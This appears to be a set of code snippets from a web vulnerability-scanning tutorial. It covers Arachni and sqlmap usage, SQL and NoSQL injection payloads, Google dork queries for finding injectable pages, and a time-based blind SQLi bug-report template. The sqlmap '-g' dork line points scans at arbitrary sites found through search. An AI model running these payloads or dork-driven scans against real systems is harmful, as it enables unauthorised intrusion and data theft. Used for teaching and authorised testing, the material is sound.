["```\nsudo ln -s /Path/to/arachni-1.5.1-0.5.12/bin/arachni* /usr/local/bin\n```", "```\n/usr/local/bin/arachni: line 3: /usr/local/bin/readlink_f.sh: No such file or directory\n/usr/local/bin/arachni: line 4: readlink_f: command not found\n/usr/local/bin/arachni: line 4: ./../system/setenv: No such file or directory\n```", "```\nsudo ln -s /Path/to/arachni-1.5.1-0.5.12/bin/readlink_f.sh /usr/local/bin/readline_f.sh\n```", "```\nSELECT title, author FROM posts WHERE id=$id\n```", "```\nSELECT title, author FROM posts WHERE id=10 OR 1=1\n```", "```\nsqlmap -u \"http://webscantest.com/datastore/search_get_by_id.php?id=3\"\n```", "```\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\n```", "```\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?\n```", "```\ninurl:index.php?id=\ninurl:buy.php?category=\ninurl:pageid=\ninurl:page.php?file=\n```", "```\nintitle:”EvoCam” inurl:”webcam.html”\n```", "```\ninurl:index.jsp? intext:\"some company title\"\n```", "```\nhttp://www.examplesite.com/index.jsp?idPagina=12\n```", "```\nsqlmap -u \"http://www.examplesite.com/index.jsp?idPagina=12\"\n```", "```\nsqlmap -g 'inurl:index.jsp? intext:\"some company title\"'\n```", "```\n--timeout\n```", "```\n--checks\n```", "```\n--scope-include-subdomains\n```", "```\n--plugin 'PLUGIN:OPTION=VALUE,OPTION2=VALUE2'\n```", "```\n--http-request-concurrency MAX_CONCURRENCY\n```", "```\n#!/bin/sh\n\narachni $1 \\\n --checks=*,-emails* \\\n --scope-include-subdomains \\\n --timeout 1:00:00 \\\n --http-request-concurrency 10\n```", "```\ndb.myCollection.find( { $where: \"this.foo == this.baz\" } );\n```", "```\n';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);\n```", "```\n' && this.password.match(/.*/)//+%00\n```", "```\narachni_reporter some_report.afr --reporter=html:outfile=my_report.html.zip\n```", "```\nhttp://webscantest.com/datastore/search_by_id.php\n```", "```\nsleep(16000/1000);\n```", "```\nCATEGORY: Blind SQLi (time-based)\n\nTIME: 2018-06-18 3:23 AM (3:23) UTC\n\nURL: http://webscantest.com/datastore/search_by_id.php\n\nPAYLOAD: sleep(16000/1000);\n\nMETHODOLOGY: Vulnerability detected with Arachni scanner, v. 1.5.1-0.5.12\n\nINSTRUCTIONS TO REPRODUCE:\n\n1\\. Navigate to \"/search_by_id.php\"\n2\\. Enter the SQLi payload into the search form.\n3\\. Submit the query.\n4\\. The time-based SQLi code will cause a delay in the SQL thread execution.\n\nATTACK SCENARIO:\nWith a time-based SQL injection vulnerability to exploit, a malicious actor could use the time-delay combined with SQL expressions to enumerate sensitive information—authentication credentials, payment data, DB information, and more.\n```"]